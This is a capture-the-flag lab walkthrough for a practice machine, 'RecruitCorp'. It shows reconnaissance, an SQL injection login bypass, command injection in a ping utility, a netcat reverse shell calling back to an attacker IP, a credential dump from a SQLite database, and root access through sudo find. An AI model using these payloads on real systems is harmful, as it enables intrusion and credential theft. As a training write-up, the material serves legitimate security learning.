### 🎯 Environment Overview & Task Objective

This section provides the active infrastructure details along with the primary scope of the assessment:

* **Attacker Machine:** `10.114.65.203` 
* **Target Machine (RecruitCorp):** `10.114.173.87` 
* **Objective:** Perform a solo penetration test against RecruitCorp's public-facing portal, fully compromise the target host, and capture all flags.
<img alt="Zrzut ekranu 2026-09-7 o 11 52 01" src="https://github.com/user-attachments/assets/05e12181-745e-4362-869b-f0ff2912ae8c" />
<img alt="Zrzut ekranu 2026-09-7 o 14 23 08" src="https://github.com/user-attachments/assets/b0b40a9a-6ef0-4c10-8fb3-7206e0822ebb" />
<img alt="Zrzut ekranu 2026-09-7 o 14 23 27" src="https://github.com/user-attachments/assets/78de5b7d-bdf9-41ac-9ae9-bba6eb4be1c5" />

### 🕵️ Passive Reconnaissance & Manual Inspection

To start the assessment without triggering security alarms, we navigate directly to the target web application at `http://10.114.173.87` in the browser. 

Passive reconnaissance allows us to understand the application's layout, structure, and potential entry points without sending aggressive automated scans:

* **Navigating to the Target:** Accessing the main landing page reveals the **RecruitCorp - Careers Portal**.
* **Source Code Inspection:** Inspecting the underlying HTML source code (`Ctrl + U`) to look for hidden developer comments, API endpoints, or leaked credentials.
* **Element Analysis:** Checking visible interactive elements, such as job application forms or search inputs, for potential vulnerabilities (like XSS or SQLi).
* **Stealth Advantage:** Manual exploration ensures we learn how the site behaves normally before running noisy automated tools.
<img alt="Zrzut ekranu 2026-09-7 o 11 56 39" src="https://github.com/user-attachments/assets/040fd55f-7b09-41b8-b41f-4672006397f2" />

### 🌐 Inspecting Page Source & Discovering Email

During manual inspection of the page source code, no obvious vulnerabilities or hidden forms were uncovered. However, we extracted a useful piece of information:

* **Discovered Contact Email:** `careers@recruitcorp.thm`

This email address could serve as a target for potential user enumeration or credential attacks later in the assessment.

---

### 🔍 Active Scanning with Nmap

Since passive inspection yielded limited actionable intelligence, we switch to active scanning using Nmap. This helps us identify open network ports, running services, and their exact version numbers:

```bash
sudo nmap -sC -sV 10.114.173.87
```
<img alt="Zrzut ekranu 2026-09-7 o 12 01 04" src="https://github.com/user-attachments/assets/b4cad8b7-e154-4bfa-807c-090202e97ec4" />

### 📊 Nmap Scan Results

The Nmap scan completed quickly and revealed four open ports running on the target machine:

* **Port 22/tcp (SSH):** OpenSSH 9.6p1
* **Port 80/tcp (HTTP):** Apache httpd 2.4.58 (Discovered `robots.txt` entry for `/admin/`)
* **Ports 139 & 445/tcp (SMB):** Samba smbd 4.6.2

### 📂 Anonymous SMB Enumeration & File Discovery

To check for unauthenticated access, I executed `smbclient` using the `-N` flag (no password) to list available shares:

```bash
smbclient -L //10.114.173.87 -N
```
<img alt="Zrzut ekranu 2026-09-7 o 12 06 25" src="https://github.com/user-attachments/assets/50662318-360c-43ee-b410-2091ee1b9fac" />

### 📄 Exfiltrating & Inspecting README.txt

Using the `get` command inside `smbclient`, I downloaded `README.txt` to the local attack machine for inspection:

```bash
smb: \> get README.txt
```
<img alt="image" src="https://github.com/user-attachments/assets/affe5147-a4b0-49b6-a7fa-b0ceea650eb9" />

### 🌐 Web Directory Brute-Forcing with Gobuster

To discover hidden directories and endpoints on the web server, I initiated a directory brute-force scan using **Gobuster** with a SecLists wordlist:

```bash
gobuster dir -u [http://10.114.173.87](http://10.114.173.87) -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,js,env,php
```
<img alt="image" src="https://github.com/user-attachments/assets/6e965606-b575-408a-81d4-beebbd9a1805" />

### 🔑 Accessing `/admin` & Testing SQL Injection

Navigating to `http://10.114.173.87/admin/` presented an internal administration portal login form labeled **RecruitCorp Admin**.

To test if the authentication mechanism is vulnerable to SQL Injection (SQLi), I submitted a classic authentication bypass payload in the **Username** field:

```sql
admin ' OR 1=1-- and password admin
```
<img alt="image" src="https://github.com/user-attachments/assets/e60efc31-d07b-4718-b1f2-4d933e17447b" />

### 🔓 Authentication Bypass & Admin Dashboard Access

Submitting the SQL injection payload successfully bypassed the login mechanism, redirecting us to the administration console:
<img alt="image" src="https://github.com/user-attachments/assets/32b88c9b-4efe-4707-bb81-aa56b943d635" />

### 👤 User ID Enumeration & Internal Reconnaissance

By querying the **User Lookup** feature (navigating to `http://10.114.173.87/admin/users/lookup.php?id=2`), we can systematically enumerate existing accounts in the database. 

Testing user IDs allows us to map out the internal user structure, roles, and administrative notes:

From a penetration testing standpoint, enumerating user records provides valuable insight into valid usernames, job responsibilities, and potentially sensitive operational details left in user notes.
<img alt="image" src="https://github.com/user-attachments/assets/f1462592-4447-4ae5-a132-9dce2cf26ca0" />

### 🎯 Discovering Internal Endpoint via User Record

Continuing the enumeration of user IDs (`http://10.114.173.87/admin/users/lookup.php?id=7`), inspecting **ID 7** revealed crucial operational information inside the developer notes:

The notes field directly exposed an internal system maintenance script located at `/admin/sysmaint-checks/ping.php`. Since ping utilities frequently process IP addresses via system commands, this endpoint serves as an immediate high-priority target for **Command Injection** testing.
<img alt="image" src="https://github.com/user-attachments/assets/36f3a4d8-6551-427b-9d7a-eafb2a095d2f" />
<img alt="Zrzut ekranu 2026-09-7 o 12 19 45" src="https://github.com/user-attachments/assets/8617d3c6-d35e-4399-8e06-3417fae44ed7" />

### 💥 Command Injection Verification & RCE Exploitation

Navigating to `/admin/sysmaint-checks/ping.php` revealed a diagnostic ping utility that accepts a `host` parameter. 

To verify if the input is directly passed to an underlying OS shell without proper sanitization, I injected a command separator (`;`) followed by the `id` command:

```text
host=localhost;id
```
<img alt="image" src="https://github.com/user-attachments/assets/989bfc73-6741-4c4b-bb6e-45730367531d" />

### ⚙️ Configuring URL-Encoded Payload (`nc mkfifo`)

To ensure the reverse shell payload passes safely through HTTP GET parameters without breaking due to special characters like spaces, ampersands, or slashes, I adjusted the settings on **revshells.com**:

* **IP & Port:** `10.114.65.203:4444`
* **Payload Choice:** `nc mkfifo`
* **Shell Type:** `/bin/bash`
* **Encoding:** `URL Encode`
<img alt="Zrzut ekranu 2026-09-7 o 12 31 48" src="https://github.com/user-attachments/assets/ce31ba58-056a-40c6-97fe-8801519eb7c2" />

### 🎧 Setting Up Penelope Listener & Catching the Reverse Shell

To handle the incoming reverse shell cleanly with automatic TTY upgrading, I used **Penelope**:

```bash
wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
```
<img alt="image" src="https://github.com/user-attachments/assets/9d24f192-3433-41b6-b19b-1bd4d87c6a70" />
<img alt="image" src="https://github.com/user-attachments/assets/ee7c6c6e-c15a-4b8d-9a53-64d657579945" />

### 🗄️ Enumerating Web Root & Discovering Database Credentials

After landing our initial shell as `www-data`, I navigated up the directory tree to inspect the web application's root directory:
<img alt="image" src="https://github.com/user-attachments/assets/f3f99bf1-d4df-4f36-a567-a0582775347e" />

### 🗃️ Locating the SQLite Database Path

To find the exact location of the SQLite database file on the filesystem, I navigated into the `/var/www/html/admin/` directory and inspected the source code of `index.php`:

```bash
cd /var/www/html/admin/
cat index.php
```
<img alt="image" src="https://github.com/user-attachments/assets/45b4cf9f-c747-401f-af0b-7211ecf0f33e" />
<img alt="image" src="https://github.com/user-attachments/assets/597c5878-89ab-4340-93a3-59b46f2c9643" />

### 🗃️ Dumping Credentials from SQLite Database

Opening `/var/lib/recruitcorp/app.db` with `sqlite3` and querying the `users` table revealed plain-text credentials for all system accounts:

```bash
sqlite3 /var/lib/recruitcorp/app.db
sqlite> .tables
users
sqlite> select * from users;
```
<img alt="image" src="https://github.com/user-attachments/assets/6ef800f3-7863-4809-8411-28365711388b" />

### 👤 Identifying Target System User (`jford`)

Inspecting `/etc/passwd` reveals system user accounts and their associated default shells. 

Among the entries, the user **`jford`** stands out:

```text
jford:x:1001:1001::/home/jford:/bin/bash
```
<img alt="image" src="https://github.com/user-attachments/assets/e61904f7-dfb2-4b44-9cb2-3ad403ec3c56" />

### 🔑 SSH Authentication as `jford`

While offline password cracking on the bcrypt hash `$2b$10$...` is a standard approach, training environments often utilize context-based passwords derived from on-page content.

Inspecting the landing page content revealed the headline **"Spring 2026 Hiring Drive"**. Appending an exclamation mark yields the valid credential:

* **Username:** `jford`
* **Password:** `spring2026!`

Using SSH to log directly into the target machine:

```bash
ssh jford@10.114.173.87
```
<img alt="image" src="https://github.com/user-attachments/assets/7e0036d4-4fc6-4f3c-b2a1-0a9af8546008" />

### 🚩 Capturing the User Flag

After gaining SSH access as `jford`, listing the home directory contents reveals the `user.txt` file:

```bash
ls
cat user.txt
```
<img alt="image" src="https://github.com/user-attachments/assets/ed7489fb-1372-49f1-886a-2a0f2af472fe" />

### 🔍 Privilege Escalation Enumeration (`sudo -l`)

Attempting to search for `flag.txt` using standard user permissions returned no results, indicating the target file resides in a restricted directory (such as `/root` or `/root/root.txt`):

```bash
find / -iname "flag.txt" 2>/dev/null

sudo -l
```
<img alt="image" src="https://github.com/user-attachments/assets/c2427ae5-a077-4bb0-99b7-aaf1d0e90814" />
<img alt="image" src="https://github.com/user-attachments/assets/353e87b7-97e2-4c38-9572-20c6995333fc" />

### 📚 Leveraging GTFOBins for Privilege Escalation

To exploit the `sudo` permission on `/usr/bin/find`, we reference **GTFOBins** (`gtfobins.github.org`), a curated repository detailing how Unix binaries can be misused to bypass local security restrictions:

1. **Searching Binary Capabilities:** Filtering for `find` shows functions like `Shell`, `File write`, and `File read`.
2. **Exploiting `File read` / `Sudo` Execution:** The documentation highlights how `find` can execute commands using the `-exec` flag without dropping elevated privileges.

Example syntax from GTFOBins:

```bash
find /path/to/input-file -exec cat {} \;
```
<img alt="image" src="https://github.com/user-attachments/assets/4ddfc635-1257-46f8-9ab2-388ccf499736" />
<img alt="image" src="https://github.com/user-attachments/assets/9beff555-552d-4acf-8e15-f47edc5cfb2b" />

### 👑 Retrieving the Root Flag & Completing System Compromise

By executing the GTFOBins payload with `sudo`, we pass the path `/root/flag.txt` directly to `/usr/bin/find`. The `-exec` switch runs `cat` with full root privileges, bypassing directory permissions:

```bash
sudo find /root/flag.txt -exec cat {} \;
```
<img alt="Zrzut ekranu 2026-09-7 o 13 10 25" src="https://github.com/user-attachments/assets/fe87cea2-166b-43ad-83e5-9037c3ce5eae" />
















